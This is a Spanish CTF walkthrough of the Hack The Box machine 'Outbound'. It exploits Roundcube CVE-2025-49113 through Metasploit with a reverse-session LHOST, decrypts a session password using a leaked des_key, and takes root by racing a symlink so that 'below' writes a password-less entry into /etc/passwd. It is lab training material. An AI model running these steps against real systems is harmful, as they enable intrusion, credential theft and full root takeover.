***
- Tags: #RCE #MySQL
***
Vamos a resolver la máquina Outbound. 
- Categoría: Fácil
- Sistema: Linux
- IP: `10.10.11.77`

### 1. Enumeración

El escaneo inicial sobre el host nos da la siguiente información:

```bash
# Nmap 7.95 scan initiated Wed Jul 16 17:25:08 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN targeted 10.10.11.77
Nmap scan report for 10.10.11.77
Host is up (0.036s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 16 17:25:16 2025 -- 1 IP address (1 host up) scanned in 8.12 seconds
```

Bien, si nos fijamos, el puerto 80 nos redirige a `http://mail.outbound.htb/` así que lo metemos en nuestro `/etc/hosts`:

```bash
10.10.11.77 outbound.htb mail.outbound.htb
```

Y ahora navegamos a la web. Nos dan unas credenciales iniciales para entrar al formulario: `tyler / LhKL1o9Nm3X2`. Tras entrar, comprobamos que se trata de Roundcube Webmail, y en la pestaña About, vemos algo muy interesante:

![[outbound1.png]]

Con una sencilla búsqueda en Google vemos que es vulnerable a RCE (CVE_2025_49113), y que cuenta con un módulo con Metasploit (multi/http/roundcube_auth_rce_cve_2025_49113). 

### 2. Explotación

Lo configuramos:

```shell
set RHOSTS mail.outbound.htb
set TARGETURI /
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
set LHOST 10.10.14.24 #Esto es nuestra IP de HTB
```

Le damos a exploit y ganamos la sesión:

![[outbound2.png]]

En este punto obtenemos una shell como el usuario `www-data` que no tiene apenas privilegios. Bien, vayamos a por información interesante. En concreto, el archivo `config.inc.php`, disponible en la ruta `/html/roundcube/config` que tiene la siguiente información:

```php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config["db_dsnw"] = "mysql://roundcube:RCDBPass2025@localhost/roundcube";

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config["imap_host"] = "localhost:143";

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config["smtp_host"] = "localhost:587";

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config["smtp_user"] = "%u";

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config["smtp_pass"] = "%p";

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config["support_url"] = "";

// Name your service. This is displayed on the login screen and in the window title
$config["product_name"] = "Roundcube Webmail";

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config["des_key"] = "rcmail-!24ByteDESkey*Str";

// List of active plugins (in plugins/ directory)
$config["plugins"] = ["archive", "zipdownload"];

// skin name: folder from skins/
$config["skin"] = "elastic";
$config["default_host"] = "localhost";
$config["smtp_server"] = "localhost";
```

Hay dos cosas aquí muy interesantes:

1. `$config["des_key"] = "rcmail-!24ByteDESkey*Str";` que es la clave de descifrado. Nos vendrá bien luego
2. `$config["db_dsnw"] = "mysql://roundcube:RCDBPass2025@localhost/roundcube";` Contiene la contraseña de la BBDD MySQL.

Bien, entramos con `mysql -u roundcube -p`, ponemos la contraseña `RCDBPass2025` y entramos. 

```mysql
MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+

MariaDB [(none)]> use roundcube;
Database changed

MariaDB [roundcube]> show tables;
show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)
```

Hay dos tablas muy interesantes. La de usuarios y la de `session`. La primera nos muestra 3 usuarios, aunque tienen sus contraseñas cifradas:

```
| jacob | mel | tyler |
```

Respecto a la otra tabla, nos muestra una sola línea con información en Base64:

```mysql
MariaDB [roundcube]> select * from session;
```

> No la pongo aquí porque se llena esto

Que decodificamos y obtenemos esta información:

```
language|s:5:"en_US";
username|s:5:"jacob";
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
...SNIP...
```

Aquí es donde entra en juego la clave de descifrado. Vamos a intentar descifrar esa contraseña. Sabemos además esto:
- Algoritmo: 3DES CBC (se mostraba en el archivo `config.inc.php`)
- Clave: `rcmail-!24ByteDESkey*Str`
- IV: extraído de los primeros 8 bytes del cifrado completo

Hacemos uso de OpenSSL para ello siguiendo estos pasos:

1. Convertir de Base64 a binario

```
echo 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/' | base64 -d > full.bin
```

> Ahora full.bin tiene este contenido: `[8 bytes de IV][n bytes de ciphertext]`

2. Separar IV y Ciphertext

```bash
❯ dd if=full.bin bs=1 count=8 of=iv.bin # IV: primeros 8 bytes
8+0 records in
8+0 records out
8 bytes copied, 0,000790918 s, 10,1 kB/s

❯ dd if=full.bin bs=1 skip=8 of=cipher.bin # Ciphertext real
16+0 records in
16+0 records out
16 bytes copied, 0,000246826 s, 64,8 kB/s
```

3. Convertir clave a HEX

```bash
echo -n 'rcmail-!24ByteDESkey*Str' | xxd -p
```

> Con esto, obtenemos la KEY: 72636d61696c2d213234427974654445536b65792a537472

4. Obtener IV en HEX

```bash
cat iv.bin | xxd -p
```

> Con esto, obtenemos el IV: 2fb46fd3403c4eec

Finalmente, desciframos:

```bash
openssl enc -des-ede3-cbc -d \
  -K 72636d61696c2d213234427974654445536b65792a537472 \
  -iv 2fb46fd3403c4eec \
  -in cipher.bin \
  -nosalt
```

- `-des-ede3-cbc` → algoritmo 3DES modo CBC    
- `-d` → descifrado    
- `-K` → clave en hex    
- `-iv` → vector de inicialización en hex    
- `-in` → el archivo que contiene el ciphertext    
- `-nosalt` → no esperamos encabezado de OpenSSL con `Salted__...`

Obtenemos el resultado final: `595mO8DmwGeD`. Esta contraseña solo funciona con el usuario `jacob`, no con `tyler` o `mel`. Una vez entramos con `su jacob` con esta nueva contraseña, vamos a su directorio `/home`, donde existe información sobre un mail:

```
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Y ojo, porque vemos en ese correo la contraseña de `jacob`: `gY4Wr3a1evp4`.  Accedemos por SSH y obtenemos la flag.
### 3. Escalada de privilegios

Antes de nada, la clave está en uno de los mails recibidos por el usuario `jacob`:

![[outbound3.png]]

Si nos fijamos bien, nos han dado permisos sobre este binario para inspeccionar logs. Confirmamos además esto:

```shell
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

La herramienta `below` tiene una vulnerabilidad conocida: **escribe archivos de log como root en `/var/log/below/` sin validar correctamente los symlinks**. Podemos aprovechar esto para hacer que escriba en `/etc/passwd`. Seguimos estos pasos para convertirnos en root:

1. **Creamos una entrada maliciosa en un archivo temporal**:

```
echo "pwn::0:0:pwn:/root:/bin/bash" > /tmp/fakepass`
```

2. **Eliminamos el archivo de log original (si existe)**:

```
rm -f /var/log/below/error_root.log
```

3. **Creamos un enlace simbólico hacia `/etc/passwd`**:

```
ln -s /etc/passwd /var/log/below/error_root.log
```

4. **Ejecutamos `below` como root para forzar la escritura** en otra terminal

```
sudo /usr/bin/below
```

5. **Reemplazamos el archivo con nuestra entrada maliciosa**:

```
cp /tmp/fakepass /var/log/below/error_root.log
```

> Si el momento es el correcto, la entrada se escribirá en `/etc/passwd`.

![[outbound4.png]]

---

Con esto, ya somos root en la máquina. El exploit se basa en una vulnerabilidad clásica de **race condition + symlink**, al estilo de los CVE relacionados con binarios inseguros que ejecutan operaciones como root.